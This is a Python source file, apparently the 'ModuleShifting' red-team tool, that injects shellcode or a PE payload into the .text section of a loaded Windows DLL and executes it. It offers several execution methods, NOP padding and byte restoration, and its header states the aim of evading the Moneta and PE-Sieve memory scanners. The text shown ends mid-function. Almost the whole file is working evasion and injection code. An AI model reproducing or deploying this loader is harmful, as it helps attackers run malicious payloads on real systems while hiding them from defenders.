#!/usr/bin/env python
# encoding: utf-8
"""
Author: @naksyn (c) 2023
Description: ModuleShifting injection technique is a modified version of Module Overloading and Module Stomping techniques that reduces memory IoCs. 
This technique coupled with a proper strategy can currently get no IoCs on Moneta and PE-Sieve.

Instructions: See README on https://github.com/naksyn/moduleshifting
Credits:
  - https://github.com/hasherezade/module_overloading    

Copyright 2023
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

from ctypes import *
from ctypes.wintypes import *
import moduleshifting.pefile as pe
import time
import sys

kernel32 = windll.kernel32
user32 = windll.user32


# debug flag
debug_output = __debug__

# system DLLs
_kernel32 = WinDLL('kernel32')
_msvcrt = CDLL('msvcrt')

# Check if the current machine is x64 or x86
isx64 = sizeof(c_void_p) == sizeof(c_ulonglong)

# type declarations
PWORD = POINTER(WORD)
PDWORD = POINTER(DWORD)
PHMODULE = POINTER(HMODULE)

LONG_PTR = c_longlong if isx64 else LONG
ULONG_PTR2 = c_ulong
ULONG_PTR = c_ulonglong if isx64 else DWORD
UINT_PTR = c_ulonglong if isx64 else c_uint
SIZE_T = ULONG_PTR
POINTER_TYPE = ULONG_PTR
POINTER_TYPE2 = ULONG_PTR2
LP_POINTER_TYPE = POINTER(POINTER_TYPE)
FARPROC = CFUNCTYPE(None)
PFARPROC = POINTER(FARPROC)
c_uchar_p = POINTER(c_ubyte)
c_ushort_p = POINTER(c_ushort)

# Generic Constants
NULL = 0

# Win32/Module-specific constants
IMAGE_SIZEOF_SHORT_NAME = 8
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
IMAGE_SIZEOF_SECTION_HEADER = 40

# Struct declarations
class IMAGE_SECTION_HEADER_MISC(Union):
    _fields_ = [
        ('PhysicalAddress', DWORD),
        ('VirtualSize', DWORD),
    ]


class IMAGE_SECTION_HEADER(Structure):
    _anonymous_ = ('Misc',)
    _fields_ = [
        ('Name', BYTE * IMAGE_SIZEOF_SHORT_NAME),
        ('Misc', IMAGE_SECTION_HEADER_MISC),
        ('VirtualAddress', DWORD),
        ('SizeOfRawData', DWORD),
        ('PointerToRawData', DWORD),
        ('PointerToRelocations', DWORD),
        ('PointerToLinenumbers', DWORD),
        ('NumberOfRelocations', WORD),
        ('NumberOfLinenumbers', WORD),
        ('Characteristics', DWORD),
    ]

PIMAGE_SECTION_HEADER = POINTER(IMAGE_SECTION_HEADER)


class IMAGE_DOS_HEADER(Structure):
    _fields_ = [
        ('e_magic', WORD),
        ('e_cblp', WORD),
        ('e_cp', WORD),
        ('e_crlc', WORD),
        ('e_cparhdr', WORD),
        ('e_minalloc', WORD),
        ('e_maxalloc', WORD),
        ('e_ss', WORD),
        ('e_sp', WORD),
        ('e_csum', WORD),
        ('e_ip', WORD),
        ('e_cs', WORD),
        ('e_lfarlc', WORD),
        ('e_ovno', WORD),
        ('e_res', WORD * 4),
        ('e_oemid', WORD),
        ('e_oeminfo', WORD),
        ('e_res2', WORD * 10),
        ('e_lfanew', LONG),
    ]

PIMAGE_DOS_HEADER = POINTER(IMAGE_DOS_HEADER)

''' ref: https://github.com/wine-mirror/wine/blob/master/include/winnt.h

typedef struct _IMAGE_TLS_DIRECTORY64 {
    ULONGLONG   StartAddressOfRawData;
    ULONGLONG   EndAddressOfRawData;
    ULONGLONG   AddressOfIndex;
    ULONGLONG   AddressOfCallBacks;
    DWORD       SizeOfZeroFill;
    DWORD       Characteristics;
} IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;


typedef VOID (CALLBACK *PIMAGE_TLS_CALLBACK)(
    LPVOID DllHandle,DWORD Reason,LPVOID Reserved
);
'''

#ref: https://github.com/arizvisa/syringe/blob/1f0ea1f514426fd774903c70d03638ecd40a97c3/lib/pecoff/portable/tls.py

class IMAGE_TLS_CALLBACK(c_void_p):
    '''
    void NTAPI IMAGE_TLS_CALLBACK(PVOID DllHandle, DWORD Reason, PVOID Reserved)
    '''

PIMAGE_TLS_CALLBACK = POINTER(IMAGE_TLS_CALLBACK)

class IMAGE_TLS_DIRECTORY(Structure):
    _fields_ = [
        ('StartAddressOfRawData', c_ulonglong),
        ('EndAddressOfRawData', c_ulonglong),
        ('AddressOfIndex', c_ulonglong),
        ('AddressOfCallBacks', c_ulonglong),
        ('SizeOfZeroFill', DWORD),
        ('Characteristics', DWORD),
    ]
    
PIMAGE_TLS_DIRECTORY = POINTER(IMAGE_TLS_DIRECTORY)



class IMAGE_DATA_DIRECTORY(Structure):
    _fields_ = [
        ('VirtualAddress', DWORD),
        ('Size', DWORD),
    ]

PIMAGE_DATA_DIRECTORY = POINTER(IMAGE_DATA_DIRECTORY)


class IMAGE_BASE_RELOCATION(Structure):
    _fields_ = [
        ('VirtualAddress', DWORD),
        ('SizeOfBlock', DWORD),
    ]

PIMAGE_BASE_RELOCATION = POINTER(IMAGE_BASE_RELOCATION)


class IMAGE_EXPORT_DIRECTORY(Structure):
    _fields_ = [
        ('Characteristics', DWORD),
        ('TimeDateStamp', DWORD),
        ('MajorVersion', WORD),
        ('MinorVersion', WORD),
        ('Name', DWORD),
        ('Base', DWORD),
        ('NumberOfFunctions', DWORD),
        ('NumberOfNames', DWORD),
        ('AddressOfFunctions', DWORD),
        ('AddressOfNames', DWORD),
        ('AddressOfNamesOrdinals', DWORD),
    ]

PIMAGE_EXPORT_DIRECTORY = POINTER(IMAGE_EXPORT_DIRECTORY)


class IMAGE_IMPORT_DESCRIPTOR_START(Union):
    _fields_ = [
        ('Characteristics', DWORD),
        ('OriginalFirstThunk', DWORD),
    ]


class IMAGE_IMPORT_DESCRIPTOR(Structure):
    _anonymous_ = ('DUMMY',)
    _fields_ = [
        ('DUMMY', IMAGE_IMPORT_DESCRIPTOR_START),
        ('TimeDateStamp', DWORD),
        ('ForwarderChain',DWORD),
        ('Name', DWORD),
        ('FirstThunk', DWORD),
    ]

PIMAGE_IMPORT_DESCRIPTOR = POINTER(IMAGE_IMPORT_DESCRIPTOR)


class IMAGE_IMPORT_BY_NAME(Structure):
    _fields_ = [
        ('Hint', WORD),
        ('Name', ARRAY(BYTE, 1)),
    ]

PIMAGE_IMPORT_BY_NAME = POINTER(IMAGE_IMPORT_BY_NAME)

class IMAGE_OPTIONAL_HEADER(Structure):
    _fields_ = [
        ('Magic', WORD),
        ('MajorLinkerVersion', BYTE),
        ('MinorLinkerVersion', BYTE),
        ('SizeOfCode', DWORD),
        ('SizeOfInitializedData', DWORD),
        ('SizeOfUninitializedData', DWORD),
        ('AddressOfEntryPoint', DWORD),
        ('BaseOfCode', DWORD),
        ('BaseOfData', DWORD),
        ('ImageBase', POINTER_TYPE),
        ('SectionAlignment', DWORD),
        ('FileAlignment', DWORD),
        ('MajorOperatingSystemVersion', WORD),
        ('MinorOperatingSystemVersion', WORD),
        ('MajorImageVersion', WORD),
        ('MinorImageVersion', WORD),
        ('MajorSubsystemVersion', WORD),
        ('MinorSubsystemVersion', WORD),
        ('Reserved1', DWORD),
        ('SizeOfImage', DWORD),
        ('SizeOfHeaders', DWORD),
        ('CheckSum', DWORD),
        ('Subsystem', WORD),
        ('DllCharacteristics', WORD),
        ('SizeOfStackReserve', POINTER_TYPE),
        ('SizeOfStackCommit', POINTER_TYPE),
        ('SizeOfHeapReserve', POINTER_TYPE),
        ('SizeOfHeapCommit', POINTER_TYPE),
        ('LoaderFlags', DWORD),
        ('NumberOfRvaAndSizes', DWORD),
        ('DataDirectory', IMAGE_DATA_DIRECTORY * IMAGE_NUMBEROF_DIRECTORY_ENTRIES),
    ]

PIMAGE_OPTIONAL_HEADER = POINTER(IMAGE_OPTIONAL_HEADER)


class IMAGE_FILE_HEADER(Structure):
    _fields_ = [
        ('Machine', WORD),
        ('NumberOfSections', WORD),
        ('TimeDateStamp', DWORD),
        ('PointerToSymbolTable', DWORD),
        ('NumberOfSymbols', DWORD),
        ('SizeOfOptionalHeader', WORD),
        ('Characteristics', WORD),
    ]

PIMAGE_FILE_HEADER = POINTER(IMAGE_FILE_HEADER)


class IMAGE_NT_HEADERS(Structure):
    _fields_ = [
        ('Signature', DWORD),
        ('FileHeader', IMAGE_FILE_HEADER),
        ('OptionalHeader', IMAGE_OPTIONAL_HEADER),
    ]

PIMAGE_NT_HEADERS = POINTER(IMAGE_NT_HEADERS)

# Win32 API Function Prototypes
VirtualAlloc = _kernel32.VirtualAlloc
VirtualAlloc.restype = LPVOID
VirtualAlloc.argtypes = [LPVOID, SIZE_T, DWORD, DWORD]

VirtualFree = _kernel32.VirtualFree
VirtualFree.restype = BOOL
VirtualFree.argtypes = [ LPVOID, SIZE_T, DWORD ]

VirtualProtect = _kernel32.VirtualProtect
VirtualProtect.restype = BOOL
VirtualProtect.argtypes = [ LPVOID, SIZE_T, DWORD, PDWORD ]

HeapAlloc = _kernel32.HeapAlloc
HeapAlloc.restype = LPVOID
HeapAlloc.argtypes = [ HANDLE, DWORD, SIZE_T ]

GetProcessHeap = _kernel32.GetProcessHeap
GetProcessHeap.restype = HANDLE
GetProcessHeap.argtypes = []

HeapFree = _kernel32.HeapFree
HeapFree.restype = BOOL
HeapFree.argtypes = [ HANDLE, DWORD, LPVOID ]

GetProcAddress = _kernel32.GetProcAddress
GetProcAddress.restype = FARPROC
GetProcAddress.argtypes = [HMODULE, LPCSTR]

LoadLibraryA = _kernel32.LoadLibraryA
LoadLibraryA.restype = HMODULE
LoadLibraryA.argtypes = [ LPCSTR ]

LoadLibraryW = _kernel32.LoadLibraryW
LoadLibraryW.restype = HMODULE
LoadLibraryW.argtypes = [ LPCWSTR ]

FreeLibrary = _kernel32.FreeLibrary
FreeLibrary.restype = BOOL
FreeLibrary.argtypes = [ HMODULE ]

IsBadReadPtr = _kernel32.IsBadReadPtr
IsBadReadPtr.restype = BOOL
IsBadReadPtr.argtypes = [ LPCVOID, UINT_PTR ]

realloc = _msvcrt.realloc
realloc.restype = c_void_p
realloc.argtypes = [ c_void_p, c_size_t ]

EnumDesktopsW = user32.EnumDesktopsW
user32.EnumDesktopsW.argtypes = [HWINSTA, LPVOID, LPARAM]
user32.EnumDesktopsW.restype = DWORD

GetProcessWindowStation = user32.GetProcessWindowStation

CreateThread = _kernel32.CreateThread
CreateThread.argtypes = [ LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, LPVOID ]
CreateThread.restype = HANDLE

WaitForSingleObject = _kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [HANDLE, DWORD]
WaitForSingleObject.restype = DWORD

# Type declarations 
DllEntryProc = WINFUNCTYPE(BOOL, HINSTANCE, DWORD, LPVOID)
PDllEntryProc = POINTER(DllEntryProc)
TLSexecProc = WINFUNCTYPE(BOOL, HINSTANCE, DWORD, LPVOID)
PTLSExecProc = POINTER(TLSexecProc)
HMEMORYMODULE = HMODULE

ExeEntryProc = WINFUNCTYPE(BOOL, LPVOID)
PExeEntryProc = POINTER(ExeEntryProc)

# Constants
MEM_COMMIT = 0x00001000
MEM_DECOMMIT = 0x4000
MEM_RELEASE = 0x8000
MEM_RESERVE = 0x00002000
MEM_FREE = 0x10000
MEM_MAPPED = 0x40000
MEM_RESET = 0x00080000

PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_WRITECOPY = 0x08
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_WRITECOPY = 0x80
PAGE_NOCACHE = 0x200

ProtectionFlags = ARRAY(ARRAY(ARRAY(c_int, 2), 2), 2)(
    (
        (PAGE_NOACCESS, PAGE_WRITECOPY),
        (PAGE_READONLY, PAGE_READWRITE),
    ), (
        (PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY),
        (PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE),
    ),
)


IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000
IMAGE_SCN_MEM_DISCARDABLE = 0x02000000
IMAGE_SCN_MEM_NOT_CACHED = 0x04000000
IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080

IMAGE_DIRECTORY_ENTRY_EXPORT = 0
IMAGE_DIRECTORY_ENTRY_IMPORT = 1
IMAGE_DIRECTORY_ENTRY_RESOURCE = 2
IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
IMAGE_DIRECTORY_ENTRY_SECURITY = 4
IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
IMAGE_DIRECTORY_ENTRY_DEBUG = 6
# IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7
IMAGE_DIRECTORY_ENTRY_ARCHITECTURE = 7
IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8
IMAGE_DIRECTORY_ENTRY_TLS = 9
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT = 11
IMAGE_DIRECTORY_ENTRY_IAT = 12
IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13
IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14

DLL_PROCESS_ATTACH = 1
DLL_THREAD_ATTACH = 2
DLL_THREAD_DETACH = 3
DLL_PROCESS_DETACH = 0

INVALID_HANDLE_VALUE = -1

IMAGE_SIZEOF_BASE_RELOCATION = sizeof(IMAGE_BASE_RELOCATION)
IMAGE_REL_BASED_ABSOLUTE = 0
IMAGE_REL_BASED_HIGH = 1
IMAGE_REL_BASED_LOW = 2
IMAGE_REL_BASED_HIGHLOW = 3
IMAGE_REL_BASED_HIGHADJ = 4
IMAGE_REL_BASED_MIPS_JMPADDR = 5
IMAGE_REL_BASED_MIPS_JMPADDR16 = 9
IMAGE_REL_BASED_IA64_IMM64 = 9
IMAGE_REL_BASED_DIR64 = 10

_IMAGE_ORDINAL_FLAG64 = 0x8000000000000000
_IMAGE_ORDINAL_FLAG32 = 0x80000000
_IMAGE_ORDINAL64 = lambda o: (o & 0xffff)
_IMAGE_ORDINAL32 = lambda o: (o & 0xffff)
_IMAGE_SNAP_BY_ORDINAL64 = lambda o: ((o & _IMAGE_ORDINAL_FLAG64) != 0)
_IMAGE_SNAP_BY_ORDINAL32 = lambda o: ((o & _IMAGE_ORDINAL_FLAG32) != 0)
IMAGE_ORDINAL = _IMAGE_ORDINAL64 if isx64 else _IMAGE_ORDINAL32
IMAGE_SNAP_BY_ORDINAL = _IMAGE_SNAP_BY_ORDINAL64 if isx64 else _IMAGE_SNAP_BY_ORDINAL32
IMAGE_ORDINAL_FLAG = _IMAGE_ORDINAL_FLAG64 if isx64 else _IMAGE_ORDINAL_FLAG32

IMAGE_DOS_SIGNATURE = 0x5A4D # MZ
IMAGE_OS2_SIGNATURE = 0x454E # NE
IMAGE_OS2_SIGNATURE_LE = 0x454C # LE
IMAGE_VXD_SIGNATURE = 0x454C # LE
IMAGE_NT_SIGNATURE = 0x00004550 # PE00

class MEMORYMODULE(Structure):
    _fields_ = [
        ('headers', PIMAGE_NT_HEADERS),
        ('codeBase', c_void_p),
        ('modules', PHMODULE),
        ('numModules', c_int),
        ('initialized', c_int),
    ]
PMEMORYMODULE = POINTER(MEMORYMODULE)

def as_unsigned_buffer(sz=None, indata=None):
    if sz is None:
        if indata is None:
            raise Exception('Must specify initial data or a buffer size.')
        sz = len(indata)
    rtype = (c_ubyte * sz)
    if indata is None:
        return rtype
    else:
        tindata = type(indata)
        if tindata in [ int, int ]:
            return rtype.from_address(indata)
        elif tindata in [ c_void_p, DWORD, POINTER_TYPE ] or hasattr(indata, 'value') and type(indata.value) in [ int, int ]:
            return rtype.from_address(indata.value)
        else:
            return rtype.from_address(addressof(indata))

def create_unsigned_buffer(sz, indata):
    res = as_unsigned_buffer(sz)()
    for i, c in enumerate(indata):
        if type(c) in [ str, str, str ]:
            c = ord(c)
        res[i] = c
    return res

def getprocaddr(handle,func):
    kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    kernel32.GetProcAddress.restype = c_void_p
    address = kernel32.GetProcAddress(handle, func)
    return address

class ModuleShifting(pe.PE):

    _foffsets_ = {}

    def __init__(self, hostingdll, data=None, name=None, debug=False, FP_bytes=None, shellcode=False, tgtsection=None, execmethod='funcpointer'):
        self._debug_ = debug or debug_output
        self.hostingdll = hostingdll
        self.tgtsection = tgtsection if tgtsection is not None else '.text'
        self.FP_bytes = FP_bytes
        self.is_shellcode = shellcode
        self.execmethod= execmethod
        if not self.is_shellcode:
            pe.PE.__init__(self, name, data)
        else:
            self.__data__ = data
        self.load_module()

    def dbg(self, msg, *args):
        if not self._debug_: return
        if len(args) > 0:
            msg = msg % tuple(args)
        print('DEBUG: %s' % msg)

    def load_module(self):

        if not self.is_shellcode:
            if not self.is_exe() and not self.is_dll():
                raise WindowsError('The specified module does not appear to be an exe nor a dll.')
            if self.PE_TYPE == pe.OPTIONAL_HEADER_MAGIC_PE and isx64:
                raise WindowsError('The exe you attempted to load appears to be an 32-bit exe, but you are using a 64-bit version of Python.')
            elif self.PE_TYPE == pe.OPTIONAL_HEADER_MAGIC_PE_PLUS and not isx64:
                raise WindowsError('The exe you attempted to load appears to be an 64-bit exe, but you are using a 32-bit version of Python.')
        
        
       
        dll_handle = ctypes.wintypes.HMODULE(self.hostingdll._handle)
        
        dll_path = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
        ctypes.windll.kernel32.GetModuleFileNameW(dll_handle, dll_path, ctypes.wintypes.MAX_PATH)
        self.hostingdllparsed = pefile.PE(dll_path.value)
        
        dll_size=self.hostingdllparsed.OPTIONAL_HEADER.SizeOfImage
        
        for section in self.hostingdllparsed.sections:
            if section.Name.decode().strip('\x00').lower() == self.tgtsection:
                self.tgtsectionaddr= section.VirtualAddress
                self.tgtsectionsize= section.SizeOfRawData
                self.tgtsectionprots = section.Characteristics
                break
        if self.tgtsectionaddr:
            self.dbg('Found address of %s section %s: 0x%x with size 0x%x bytes', self.hostingdll._name, self.tgtsection, self.tgtsectionaddr, self.tgtsectionsize)
        else:
            raise WindowsError('%s section on %s dll  cannot be found', self.tgtsection, self.hostingdll._name)
        
        if not self.is_shellcode:
            if self.FP_bytes:
                if self.hostingdllparsed.OPTIONAL_HEADER.SizeOfImage < self.OPTIONAL_HEADER.SizeOfImage:
                    raise WindowsError('There is not enough space for payload to be written in this dll')
                self.dbg('Checking for space to match False Positive bytes: 0x%x', self.FP_bytes)
                for section in self.sections:
                    if section.Name.decode().strip('\x00').lower() == '.text':
                        payload_text_section_size = section.SizeOfRawData
                    if section.Name.decode().strip('\x00').lower() == '.rdata':
                        payload_rdata_section_size = section.SizeOfRawData
                self.dbg('Payload .text section size: 0x%x', payload_text_section_size)
                self.dbg('Payload .rdata section size: 0x%x', payload_rdata_section_size)
                self.dbg('Hostingdll .text section size: 0x%x', hostingdll_text_section_size)
                self.dbg('Payload total size: 0x%x', self.OPTIONAL_HEADER.SizeOfImage)
                if self.OPTIONAL_HEADER.SizeOfImage > self.tgtsectionsize:
                    raise WindowsError('Not enough space on hosting dll .text section to host the payload ')
                elif payload_text_section_size > self.FP_bytes:
                    raise WindowsError('Payload .text size is greater than False Positive Bytes to match. ')
                elif payload_text_section_size + payload_rdata_section_size > self.FP_bytes:
                    self.dbg('False Positive Bytes can be matched adjusting permissions on .rdata section')
            

        mapped=self.hostingdll._handle + self.tgtsectionaddr
        print(hex(mapped))
        
        
        self._codebaseaddr = mapped
        self._headersaddr = mapped
        
        oldProtect = DWORD(0)

        # payload is shellcode
        if self.is_shellcode:
            self.sc_padding=b''
            self.size_padding=0
            if self.FP_bytes:
                if len(self.__data__) > self.FP_bytes:
                    raise WindowsError('Shellcode data greater than False Positive bytes by 0x%x bytes. Try with a smaller shellcode ', len(self.__data__) - self.FP_bytes)
                self.size_padding = self.FP_bytes - len(self.__data__) 
                self.sc_padding= b'\x90'*self.size_padding

            self.dbg('setting RW protection on address: 0x%x', mapped)      
            VP_res = VirtualProtect(
                cast(mapped,c_void_p),
                len(self.__data__) + self.size_padding,
                PAGE_READWRITE,  
                byref(oldProtect)
            )
            if VP_res == 0:
                print(f'[!] Error code no: {ctypes.GetLastError()}')
                raise WindowsError('VP error')
            
            self.mod_bytes_size=len(self.__data__) + self.size_padding
            buf = ctypes.create_string_buffer(self.mod_bytes_size)
            address= self.hostingdll._handle + self.tgtsectionaddr
            ctypes.memmove(buf, address, self.mod_bytes_size)
            backupdata = buf.raw
            self.targetsection_backupbuffer= create_unsigned_buffer(self.mod_bytes_size, backupdata)

            memset(cast(mapped,c_void_p), 0, len(self.__data__) + self.size_padding)

            self.write_exec_shellcode()
            time.sleep(1)
            self.restore()
            self.dbg('Shellcode executed - Sleeping 1200 secs')
            time.sleep(1200)
            self.dbg('Time\'s up - Exiting')
            return
            

        # data is a PE or a dll
        self.dbg('setting RW protection on address: 0x%x', mapped)      
        VP_res = VirtualProtect(
            cast(mapped,c_void_p), 
            self.OPTIONAL_HEADER.SizeOfImage,
            PAGE_READWRITE,  
            byref(oldProtect)
        )
        
        if VP_res == 0:
            print(f'[!] Error code no: {ctypes.GetLastError()}')
            raise WindowsError('VP error')
        
        memset(cast(mapped,c_void_p), 0, self.OPTIONAL_HEADER.SizeOfImage)
        

        codebase = self._codebaseaddr
        self.dbg('Reserved %d bytes for dll at address: 0x%x', self.OPTIONAL_HEADER.SizeOfImage, codebase)
        self.moduleshifting = cast(HeapAlloc(GetProcessHeap(), 0, sizeof(MEMORYMODULE)), PMEMORYMODULE)
        self.moduleshifting.contents.codeBase = codebase
        self.moduleshifting.contents.numModules = 0
        self.moduleshifting.contents.modules = cast(NULL, PHMODULE)
        self.moduleshifting.contents.initialized = 0
        

        szheaders = self.DOS_HEADER.e_lfanew + self.OPTIONAL_HEADER.SizeOfHeaders
        print(hex(szheaders))
        print(self.__data__[:szheaders])
        tmpheaders = create_unsigned_buffer(szheaders, self.__data__[:szheaders])
        self.dbg('Copying target PE headers after orignal hosting dll PE ad address 0x%x', mapped)
        if not memmove(cast(mapped,c_void_p), cast(tmpheaders,c_void_p),szheaders):
             raise RuntimeError('memmove failed')
        del tmpheaders
        

        mappedheaders= mapped + self.DOS_HEADER.e_lfanew
        self._headersaddr += self.DOS_HEADER.e_lfanew
        self.moduleshifting.contents.headers = cast(mappedheaders, PIMAGE_NT_HEADERS)
        self.moduleshifting.contents.headers.contents.OptionalHeader.ImageBase = POINTER_TYPE(self._codebaseaddr)
        self.dbg('Copying sections to reserved memory block.')
        self.copy_sections()

        
        self.dbg('Checking for base relocations.')
        locationDelta = codebase - self.OPTIONAL_HEADER.ImageBase
        if locationDelta != 0:
            self.dbg('Detected relocations - Performing base relocations..')
            self.perform_base_relocations(locationDelta)

        self.dbg('Building import table.')
        self.build_import_table()
        self.dbg('Finalizing sections.')
        self.finalize_sections()
        #self.mapped_shifted_text= self.hostingdll._handle + self.hostingdllparsed.sections[0].VirtualAddress
        
         
        self.dbg('Executing TLS.')
        self.ExecuteTLS()
        



        entryaddr = self.moduleshifting.contents.headers.contents.OptionalHeader.AddressOfEntryPoint
        
        
        self.dbg('Checking for entry point.')
        if entryaddr != 0:
            entryaddr += codebase         
                                                               
            
            if self.is_exe():
                ExeEntry = ExeEntryProc(entryaddr)
                if not bool(ExeEntry):
                    self.free_library()
                    raise WindowsError('exe has no entry point.\n')
                try:
                    self.dbg("Calling exe/shellcode entrypoint 0x%x", entryaddr)
                    
                    success = ExeEntry(entryaddr)
                except Exception as e:
                    print(e)
                    
            elif self.is_dll():
                DllEntry = DllEntryProc(entryaddr)
                if not bool(DllEntry):
                    self.free_library()
                    raise WindowsError('dll has no entry point.\n')
                    
                try:
                    self.dbg("Calling dll entrypoint 0x%x with DLL_PROCESS_ATTACH", entryaddr)
                    success = DllEntry(codebase, DLL_PROCESS_ATTACH, 0)
                except Exception as e:
                    print(e)
                    
            
            if not bool(success):
                if self.is_dll():
                    self.free_library()
                    raise WindowsError('dll could not be loaded.')
                else:
                    self.free_exe()
                    raise WindowsError('exe could not be loaded')
            self.moduleshifting.contents.initialized = 1

    def IMAGE_FIRST_SECTION(self):
        return self._headersaddr + IMAGE_NT_HEADERS.OptionalHeader.offset + self.FILE_HEADER.SizeOfOptionalHeader
    
    def write_exec_shellcode(self):
        dest= self._codebaseaddr
        
        
        tmpdata = create_unsigned_buffer(self.mod_bytes_size, self.__data__ + self.sc_padding)
        if not memmove(cast(dest,c_void_p), tmpdata, len(self.__data__) + self.size_padding):
                raise RuntimeError('memmove failed')
        del tmpdata
        self.dbg('Copied %s shellcode bytes to address: 0x%x', len(self.__data__) + self.size_padding, dest)
        
        oldProtect = DWORD(0)

        self.dbg('setting RX protection on address: 0x%x', dest)      
        VP_res = VirtualProtect(
                cast(dest,c_void_p),
                len(self.__data__) + self.size_padding,
                PAGE_EXECUTE_READ,  
                byref(oldProtect))
        
        if VP_res == 0:
            print(f'[!] Error code no: {ctypes.GetLastError()}')
            raise WindowsError('VP error')
        
        ExeEntry = ExeEntryProc(dest)
        if not bool(ExeEntry):
            raise WindowsError('Error in finding shellcode execution point.\n')
        try:
            if self.execmethod.lower() == 'enumdesktopsw':
                self.dbg("Executing shellcode at address 0x%x using EnumDesktopsW function callback", dest)            
                EnumDesktopsW(GetProcessWindowStation(), dest, 0);
            elif self.execmethod.lower() == 'funcpointer':
                self.dbg("Executing shellcode at address 0x%x using function pointer", dest)            
                success = ExeEntry(dest)
            elif self.execmethod.lower() == 'createthread':
                self.dbg("Executing shellcode at address 0x%x using CreateThread", dest)            
                threadHandle = CreateThread(0, 0, dest, 0, 0, 0)
                WaitForSingleObject(threadHandle, 0xFFFFFFFF)
            else:
                print('ERROR: Shellcode execution method not recognized. Please use supported methods. Exiting...')
                sys.exit()
                
        except Exception as e:
            print(e)  
 
    def restore(self):
        oldProtect = DWORD(0)
        mod_bytes_size=len(self.__data__)+self.size_padding
        self.dbg('Cleanup - setting RW protection on address: 0x%x', self._codebaseaddr)      
        VP_res = VirtualProtect(
                cast(self._codebaseaddr,c_void_p),
                mod_bytes_size,
                PAGE_READWRITE,  
                byref(oldProtect)
            )
        if VP_res == 0:
            print(f'[!] Error code no: {ctypes.GetLastError()}')
            raise WindowsError('VP error')
        self.dbg('Cleanup - calling memset for 0x%x bytes at address: 0x%x', mod_bytes_size, self._codebaseaddr)      
        memset(cast(self._codebaseaddr,c_void_p), 0, mod_bytes_size)
        dest= self._codebaseaddr
        
        self.dbg('Cleanup - restoring original data for %s at addr 0x%x for %s number of bytes', self.hostingdll._name, dest, mod_bytes_size)
        if not memmove(cast(dest,c_void_p), self.targetsection_backupbuffer, mod_bytes_size):
                raise RuntimeError('memmove failed')
        del self.targetsection_backupbuffer
        
        
        checkCharacteristic = lambda prots, flag: 1 if (prots & flag) != 0 else 0
        self.dbg("Checking original sections permissions: execute %d",checkCharacteristic(self.tgtsectionprots, IMAGE_SCN_MEM_EXECUTE))
        executable = checkCharacteristic(self.tgtsectionprots, IMAGE_SCN_MEM_EXECUTE)
        self.dbg("Checking original sections permissions: read %d",checkCharacteristic(self.tgtsectionprots, IMAGE_SCN_MEM_READ))
        readable = checkCharacteristic(self.tgtsectionprots, IMAGE_SCN_MEM_READ)
        writeable = checkCharacteristic(self.tgtsectionprots, IMAGE_SCN_MEM_WRITE)
        self.dbg("Checking original sections permissions: write %d",checkCharacteristic(self.tgtsectionprots, IMAGE_SCN_MEM_WRITE))
        if readable == 1 and writeable == 1 and executable == 1:
            protection = PAGE_EXECUTE_READWRITE
        elif readable == 1 and writeable == 1:
            protection = PAGE_READWRITE
        elif readable == 1 and executable == 1:
            protection = PAGE_EXECUTE_READ
        elif readable == 1:
            protection = PAGE_READONLY
        elif executable == 1 and writeable == 0 and readable == 0:
            protection = PAGE_EXECUTE
        else:
            self.dbg('Error - Could not find proper protections to reset back on: 0x%x', self._codebaseaddr)          
        self.dbg('Cleanup - setting original protections on address: 0x%x', self._codebaseaddr)      
        VP_res = VirtualProtect(
                cast(self._codebaseaddr,c_void_p), 
                mod_bytes_size,
                protection,  
                byref(oldProtect)
            )
        
        if VP_res == 0:
            print(f'[!] Error code no: {ctypes.GetLastError()}')
            raise WindowsError('VP error')

    def copy_sections(self):
        codebase = self._codebaseaddr
        sectionaddr = self.IMAGE_FIRST_SECTION()
        numSections = self.moduleshifting.contents.headers.contents.FileHeader.NumberOfSections
        
        for i in range(0, numSections):    
            if self.sections[i].SizeOfRawData == 0:
                size = self.OPTIONAL_HEADER.SectionAlignment
                if size > 0:
                    destBaseAddr = codebase + self.sections[i].VirtualAddress

                continue
            size = self.sections[i].SizeOfRawData
            #dest = VirtualAlloc(codebase + self.sections[i].VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE )
            dest= codebase + self.sections[i].VirtualAddress
            if dest <=0:
